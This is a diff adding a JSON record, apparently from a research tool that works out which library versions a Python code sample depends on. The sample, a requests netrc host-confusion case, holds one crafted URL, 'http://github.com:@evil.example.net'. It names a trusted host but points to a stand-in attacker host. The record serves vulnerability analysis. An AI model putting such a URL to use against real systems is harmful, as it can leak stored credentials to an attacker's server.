@@ -1,0 +1,76 @@
+{
+  "schema_version": "api_version_constraint_v0.1",
+  "sample_id": "avcs_requests_netrc_host_confusion_true",
+  "api_call_evidence_file": "output/avcs_requests_netrc_host_confusion_true_api_calls_v0.json",
+  "history_file": "data/avcs_validation/api_history/requests_api_history_evidence_v0.json",
+  "history_schema_version": "avcs_api_history_evidence_v0.1",
+  "status": "resolved",
+  "api_call_count": 1,
+  "resolved_api_call_count": 1,
+  "unresolved_api_call_count": 0,
+  "call_constraints": [
+    {
+      "distribution": "requests",
+      "normalized_distribution": "requests",
+      "api_symbol": "requests.get",
+      "call_text": "requests.get(\n    \"http://github.com:@evil.example.net\"\n)",
+      "call_shape": {
+        "explicit_positional_arg_count": 1,
+        "positional_arg_values": [
+          {
+            "position": 0,
+            "source_text": "\"http://github.com:@evil.example.net\"",
+            "resolved_symbol": null,
+            "literal_value": "http://github.com:@evil.example.net"
+          }
+        ],
+        "keyword_arg_names": [],
+        "keyword_arg_values": {},
+        "has_star_args": false,
+        "has_star_kwargs": false
+      },
+      "location": {
+        "file": "data/avcs_validation/avcs_requests_netrc_host_confusion_true.py",
+        "line": 4,
+        "column": 12
+      },
+      "status": "resolved",
+      "matched_rules": [
+        {
+          "rule_id": "requests_get_one_positional",
+          "version_specifier": ">=0.2.0",
+          "evidence_type": "real_api_history_evidence",
+          "evidence_ref": "Requests 0.2.0 / 2.32.3 / 2.32.4 official release and source evidence",
+          "evidence_note": "Requests 0.2.0 is the first confirmed public release boundary for the selected requests.get(url) form. Its package root re-exports requests.core, where get(url, ...) is defined. The same one-positional-URL form remains supported immediately before and after the vulnerability fix boundary."
+        }
+      ],
+      "rejected_rules": [],
+      "version_specifiers": [
+        ">=0.2.0"
+      ],
+      "combined_version_specifier": ">=0.2.0",
+      "simplified_version_specifier": ">=0.2.0"
+    }
+  ],
+  "distribution_constraints": [
+    {
+      "distribution": "requests",
+      "normalized_distribution": "requests",
+      "status": "resolved",
+      "api_call_count": 1,
+      "resolved_api_call_count": 1,
+      "unresolved_api_call_count": 0,
+      "resolved_api_symbols": [
+        "requests.get"
+      ],
+      "unresolved_api_symbols": [],
+      "s_api": {
+        "raw_specifier": ">=0.2.0",
+        "simplified_specifier": ">=0.2.0",
+        "evidence_rule_ids": [
+          "requests_get_one_positional"
+        ]
+      }
+    }
+  ]
+}
